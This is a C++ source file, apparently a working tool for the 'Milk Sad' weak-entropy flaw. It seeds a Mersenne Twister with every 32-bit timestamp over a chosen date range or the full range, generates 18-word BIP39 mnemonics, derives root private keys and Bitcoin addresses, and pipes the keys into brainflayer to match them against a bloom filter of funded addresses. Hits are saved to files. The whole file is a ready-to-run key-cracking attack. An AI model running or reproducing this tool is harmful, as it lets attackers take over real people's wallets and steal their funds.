/**
 * Milk Sad Vulnerability Reproducer (Upgraded - Address Output Variant)
 * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
 * Checks against brainflayer via pipe.
 * * UPGRADE 1: Menampilkan 100 sampel hasil generate pertama di terminal.
 * * UPGRADE 2: Mengkonversi Private Key menjadi Compressed Bitcoin Address.
 */

#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cmath>
#include <stdexcept>
#include <algorithm>
#include <cctype>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <climits>

// --- OpenSSL Includes ---
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/ec.h>     // For Public Key Generation
#include <openssl/obj_mac.h>// For NID_secp256k1
#include <openssl/ripemd.h> // For Hash160
#include <openssl/bn.h>     // For BigNum operations

// --- Configuration ---
const std::string WORDLIST_DIR = "./Wordlist/";
const std::string OUTPUT_FILE_PREFIX = "found_keys_";
const uint64_t REPORT_INTERVAL = 100000; // Report to stdout every N keys per thread
const int DEFAULT_NUM_THREADS = 4; // Default safe number
const int MAX_DISPLAY_COUNT = 100; // Limit display to first 100

// --- Global Flags ---
std::atomic<bool> g_stop_flag(false);

// --- Signal Handler ---
void signal_handler(int) {
    g_stop_flag = true;
    std::cout << "\n[!] Interrupt received. Stopping threads..." << std::endl;
}

// --- Helper Functions ---

bool file_exists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::string path = WORDLIST_DIR + filename;
    
    // Fallback: check current directory if not in Wordlist/
    if (!file_exists(path) && file_exists(filename)) {
        path = filename;
    }

    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open wordlist: " + path);
    }

    std::string word;
    while (std::getline(file, word)) {
        // Trim whitespace
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) continue;
        size_t last = word.find_last_not_of(" \t\r\n");
        wordlist.push_back(word.substr(first, (last - first + 1)));
    }

    if (wordlist.size() != 2048) {
        throw std::runtime_error("Wordlist must contain exactly 2048 words. Found: " + std::to_string(wordlist.size()));
    }
    return wordlist;
}

// --- Crypto Functions ---

// SHA256 Helper
std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

// RIPEMD160 Helper
std::vector<uint8_t> ripemd160(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(RIPEMD160_DIGEST_LENGTH);
    RIPEMD160_CTX ctx;
    RIPEMD160_Init(&ctx);
    RIPEMD160_Update(&ctx, data.data(), data.size());
    RIPEMD160_Final(hash.data(), &ctx);
    return hash;
}

// Base58 Encoding
const char* pszBase58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
std::string base58_encode(const std::vector<uint8_t>& data) {
    // Skip leading zeros
    int zeros = 0;
    while (zeros < data.size() && data[zeros] == 0) zeros++;
    
    // Convert to Bignum
    BIGNUM* bn = BN_new();
    BN_bin2bn(data.data(), data.size(), bn);
    
    BIGNUM* bn58 = BN_new();
    BN_set_word(bn58, 58);
    
    BIGNUM* bn0 = BN_new();
    BN_set_word(bn0, 0);
    
    BIGNUM* dv = BN_new();
    BIGNUM* rem = BN_new();
    
    std::string result = "";
    BN_CTX* ctx = BN_CTX_new();

    while (BN_cmp(bn, bn0) > 0) {
        BN_div(dv, rem, bn, bn58, ctx);
        BN_copy(bn, dv);
        result += pszBase58[BN_get_word(rem)];
    }
    
    // Append leading '1's for each leading zero byte
    for (int i = 0; i < zeros; i++) {
        result += '1';
    }
    
    std::reverse(result.begin(), result.end());
    
    BN_CTX_free(ctx);
    BN_free(bn);
    BN_free(bn58);
    BN_free(bn0);
    BN_free(dv);
    BN_free(rem);
    
    return result;
}

// Convert Hex Private Key to Compressed Address
std::string hex_to_compressed_address(const std::string& hex_priv) {
    // 1. Convert Hex String to Byte Vector
    std::vector<uint8_t> priv_bytes;
    for (size_t i = 0; i < hex_priv.length(); i += 2) {
        std::string byteString = hex_priv.substr(i, 2);
        uint8_t byte = (uint8_t)strtol(byteString.c_str(), NULL, 16);
        priv_bytes.push_back(byte);
    }

    // 2. Get Public Key (Compressed) using OpenSSL EC
    EC_KEY* key = EC_KEY_new_by_curve_name(NID_secp256k1);
    BIGNUM* priv_bn = BN_new();
    BN_bin2bn(priv_bytes.data(), priv_bytes.size(), priv_bn);
    
    // Derive Public Key point
    const EC_GROUP* group = EC_KEY_get0_group(key);
    EC_POINT* pub_point = EC_POINT_new(group);
    EC_POINT_mul(group, pub_point, priv_bn, NULL, NULL, NULL);
    EC_KEY_set_private_key(key, priv_bn);
    EC_KEY_set_public_key(key, pub_point);
    
    // Set Compressed Format
    EC_KEY_set_conv_form(key, POINT_CONVERSION_COMPRESSED);

    // Serialize Public Key
    int pub_len = i2o_ECPublicKey(key, NULL);
    std::vector<uint8_t> pub_bytes(pub_len);
    unsigned char* pub_ptr = pub_bytes.data();
    i2o_ECPublicKey(key, &pub_ptr);

    // Cleanup OpenSSL objects
    EC_POINT_free(pub_point);
    BN_free(priv_bn);
    EC_KEY_free(key);

    // 3. SHA256(PubKey)
    std::vector<uint8_t> sha256_res = sha256(pub_bytes);

    // 4. RIPEMD160(SHA256_res)
    std::vector<uint8_t> ripemd_res = ripemd160(sha256_res);

    // 5. Add Network Byte (0x00 for Mainnet)
    std::vector<uint8_t> payload;
    payload.push_back(0x00);
    payload.insert(payload.end(), ripemd_res.begin(), ripemd_res.end());

    // 6. Double SHA256 for Checksum
    std::vector<uint8_t> hash1 = sha256(payload);
    std::vector<uint8_t> hash2 = sha256(hash1);

    // Take first 4 bytes of checksum
    for (int i = 0; i < 4; i++) {
        payload.push_back(hash2[i]);
    }

    // 7. Base58 Encode
    return base58_encode(payload);
}

// Generate BIP39 Mnemonic from a 32-bit Time Seed (Modified for 18 Words / 192-bit)
std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    std::mt19937 engine(seed_value);
    const int ENTROPY_BYTES = 24; 
    std::vector<uint8_t> entropy(ENTROPY_BYTES);
    
    for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
        uint32_t random_block = engine();
        std::memcpy(&entropy[i], &random_block, 4);
    }

    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];

    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte); 

    std::string mnemonic;
    mnemonic.reserve(200); 

    const int NUM_WORDS = 18;
    for (int i = 0; i < NUM_WORDS; ++i) {
        int start_bit = i * 11;
        int word_index = 0;

        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8);

            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }

        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }

    return mnemonic;
}

// Convert Mnemonic to Root Private Key
std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    const int iterations = 2048;
    const std::string salt = "mnemonic"; 
    std::vector<uint8_t> seed(64);
    
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) {
        return "";
    }

    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    
    HMAC(EVP_sha512(), 
         reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), 
         hmac_result, &hmac_len);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) { // Only first 32 bytes for PrivKey
        ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    }
    return ss.str();
}

// --- Time Utilities ---

uint32_t get_unix_timestamp(const std::tm& tm) {
    std::tm temp_tm = tm;
    #ifdef _WIN32
        _putenv("TZ=UTC");
        _tzset();
    #else
        setenv("TZ", "UTC", 1);
        tzset();
    #endif
    
    time_t ts = std::mktime(&temp_tm);
    if (ts == -1) throw std::runtime_error("Invalid time format");
    return static_cast<uint32_t>(ts);
}

std::tm parse_iso_date(const std::string& s) {
    std::tm tm = {};
    std::stringstream ss(s);
    ss >> std::get_time(&tm, "%Y-%m-%d");
    if (ss.fail()) throw std::runtime_error("Parse error. Use YYYY-MM-DD");
    tm.tm_isdst = 0;
    return tm;
}

// --- Worker Thread ---

void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::atomic<int>& display_counter, 
                   std::mutex& print_mtx) {
    
    // Command to pipe into brainflayer (Send Hex Private Key)
    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > brainflayer_found_" + std::to_string(thread_id) + ".txt 2>&1";
    
    FILE* pipe = popen(cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] Error: Failed to open brainflayer pipe." << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        // Core Logic
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        // --- DISPLAY LOGIC (With Address Conversion) ---
        int current_count = display_counter.load();
        if (current_count < MAX_DISPLAY_COUNT) {
            int new_count = display_counter.fetch_add(1);
            if (new_count < MAX_DISPLAY_COUNT) {
                // Convert to Address ONLY for display (Expensive op)
                std::string address = hex_to_compressed_address(priv_hex);

                std::lock_guard<std::mutex> lock(print_mtx);
                std::cout << "\n[DISPLAY #" << (new_count + 1) << "]" << std::endl;
                std::cout << "TS      : " << ts << std::endl;
                std::cout << "Mnemonic: " << mnemonic << std::endl;
                std::cout << "PrivKey : " << priv_hex << std::endl;
                std::cout << "Address : " << address << " (Compressed)" << std::endl;
                
                if (new_count == MAX_DISPLAY_COUNT - 1) {
                    std::cout << "--- Limit of 100 displayed keys reached. Continuing silently... ---" << std::endl;
                }
            }
        }

        // Write to brainflayer (Still sending Hex PrivKey as brainflayer calculates address internally faster)
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
             break;
        }

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        // Progress logging
        if (local_processed % REPORT_INTERVAL == 0) {
            std::lock_guard<std::mutex> lock(print_mtx);
            std::cout << "[Thread " << thread_id << "] Current TS: " << ts 
                      << " | Processed: " << local_processed << std::endl;
        }
    }

    pclose(pipe);
    
    {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed << std::endl;
    }
}

// --- Main Menu & Logic ---

int main() {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    OpenSSL_add_all_algorithms();

    std::cout << "=================================================" << std::endl;
    std::cout << "   Milk Sad Vulnerability Reproducer (Address)   " << std::endl;
    std::cout << "=================================================" << std::endl;

    if (!file_exists("./brainflayer/brainflayer")) {
        std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
        return 1;
    }
    if (!file_exists("./040823BF.blf")) {
        std::cerr << "Error: Bloom filter ./040823BF.blf not found!" << std::endl;
        return 1;
    }

    std::vector<std::string> wordlist;
    try {
        std::cout << "[*] Loading english.txt..." << std::endl;
        wordlist = load_wordlist("english.txt");
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    int choice;
    std::cout << "\nSelect Mode:\n";
    std::cout << "1. Single Timestamp Check\n";
    std::cout << "2. Date Range Scan (Multithreaded)\n";
    std::cout << "3. Full 32-bit Scan (Warning: Long duration)\n";
    std::cout << "> ";
    std::cin >> choice;

    uint32_t start_ts = 0, end_ts = 0;

    if (choice == 1) {
        std::string date_str, time_str;
        std::cout << "Enter Date (YYYY-MM-DD): ";
        std::cin >> date_str;
        std::cout << "Enter Time (HH:MM:SS): ";
        std::cin >> time_str;

        std::tm tm = parse_iso_date(date_str);
        sscanf(time_str.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
        
        uint32_t ts = get_unix_timestamp(tm);
        std::cout << "\nChecking Timestamp: " << ts << std::endl;
        
        std::string m = generate_mnemonic_bip39(ts, wordlist);
        std::string k = mnemonic_to_root_key_hex(m);
        std::string a = hex_to_compressed_address(k);
        
        std::cout << "Mnemonic (18 words): " << m << std::endl;
        std::cout << "Root Key: " << k << std::endl;
        std::cout << "Address : " << a << " (Compressed)" << std::endl;
        
        std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
        system(cmd.c_str());
        return 0;

    } else if (choice == 2) {
        std::string start_str, end_str;
        std::cout << "Start Date (YYYY-MM-DD): ";
        std::cin >> start_str;
        std::cout << "End Date   (YYYY-MM-DD): ";
        std::cin >> end_str;

        std::tm tm_start = parse_iso_date(start_str);
        std::tm tm_end = parse_iso_date(end_str);
        
        tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
        tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;

        start_ts = get_unix_timestamp(tm_start);
        end_ts = get_unix_timestamp(tm_end);

    } else if (choice == 3) {
        start_ts = 0;
        end_ts = UINT_MAX;
    } else {
        std::cout << "Invalid choice." << std::endl;
        return 1;
    }

    int num_threads = DEFAULT_NUM_THREADS;
    std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
    if (std::cin.peek() != '\n') std::cin >> num_threads;
    if (num_threads < 1) num_threads = 1;

    std::cout << "\n[*] Starting Scan..." << std::endl;
    std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
    
    std::vector<std::thread> threads;
    std::atomic<uint64_t> total_counter(0);
    std::atomic<int> display_counter(0); 
    std::mutex print_mutex;

    uint64_t total_range = (uint64_t)end_ts - start_ts + 1;
    uint64_t chunk_size = total_range / num_threads;

    for (int i = 0; i < num_threads; ++i) {
        uint32_t t_start = start_ts + (i * chunk_size);
        uint32_t t_end = (i == num_threads - 1) ? end_ts : t_start + chunk_size - 1;

        threads.emplace_back(worker_thread, t_start, t_end, i, 
                             std::cref(wordlist), 
                             std::ref(total_counter),
                             std::ref(display_counter), 
                             std::ref(print_mutex));
    }

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n[!] Scan Complete." << std::endl;
    std::cout << "Check 'brainflayer_found_*.txt' files for any hits." << std::endl;

    return 0;
}
